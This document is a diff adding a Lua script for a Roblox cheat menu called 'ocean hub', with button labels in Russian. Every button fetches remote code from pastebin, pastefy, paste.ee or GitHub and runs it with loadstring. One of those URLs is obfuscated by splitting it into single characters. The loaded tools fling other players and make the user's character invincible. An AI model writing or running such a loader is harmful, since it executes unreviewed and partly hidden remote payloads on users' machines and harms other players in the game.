@@ -1,0 +1,44 @@
+local Library = loadstring(game:HttpGet("https://pastebin.com/raw/vff1bQ9F"))()
+
+local Window = Library.CreateLib("ocean hub[test]", "Ocean")
+
+-- MAIN
+
+local Op = Window:NewTab("Op")
+
+local OpSection = Op:NewSection("Op")
+
+
+
+OpSection:NewButton("Death note", "что бы это сработало игрок должен стоять на месте и не двигаться", function()
+    loadstring(game:HttpGet(('h'..'t'..'t'..'p'..'s'..':'..'/'..'/'..'p'..'a'..'s'..'t'..'e'..'f'..'y'..'.'..'a'..'pp'..'/'..'G'..'o'..'K'..'x'..'Y'..'B'..'k'..'U'..'/'..'r'..'a'..'w'), true))()
+end)
+
+
+OpSection:NewButton("Giga chad hub", "Я гига чад", function()
+    loadstring(game:HttpGet('https://raw.githubusercontent.com/OWJBWKQLAISH/GigaChad-Hub/main/Gigachad%20Hub%20V4'))()
+end)
+
+
+local Fe = Window:NewTab("fe")
+
+local FeSection = Fe:NewSection("Fe")
+
+
+FeSection:NewButton("fake tools", "хз что сюда писать", function()
+    loadstring(game:HttpGet(('https://pastefy.app/VYIAk3o1/raw'),true))()
+end)
+
+
+OpSection:NewButton("fling gui", "очень мощно", function()
+    loadstring(game:HttpGet("https://paste.ee/r/NTtmf" , true))()
+end)
+
+OpSection:NewButton("touch fling gui", "очень очень мощно", function()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/0Ben1/fe./main/Fling%20GUI"))()
+end)
+
+
+OpSection:NewButton("ignore touchinterests", "делает твоего персонажа бессмертным работает только в паркурах и обби", function()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/zephyr10101/ignore-touchinterests/main/main",true))()
+end)
